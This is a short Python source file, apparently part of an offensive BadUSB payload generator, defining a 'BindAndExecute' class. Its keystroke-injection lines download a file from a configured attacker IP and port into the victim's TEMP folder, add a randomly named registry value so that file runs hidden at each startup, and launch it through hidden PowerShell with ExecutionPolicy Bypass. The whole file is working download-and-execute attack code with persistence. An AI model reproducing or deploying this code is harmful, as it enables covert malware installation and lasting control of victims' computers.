from core.payloads.base import USBPayload
from core.utils import generate_string
from core.config import Config


class BindAndExecute(USBPayload):
    def __init__(self, config: Config):
        self.config = config
        self.source = "advanced-payload.txt"
        self.lines: dict = {
            "KEY1": f'STRING $WebClient.DownloadFile("http://{self.config.ip_address}:{self.config.server_port}/{self.config.out_file}", "$Env:TEMP\\\\{self.config.out_file}")',
            "KEY2": f'STRING New-ItemProperty -Path $path -Name "{generate_string(12)}" -Value "powershell.exe -WindowStyle hidden -file $Env:TEMP\\\\{self.config.out_file}" -PropertyType "String"',
            "KEY3": f'STRING cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $Env:TEMP\\{self.config.out_file}',
        }
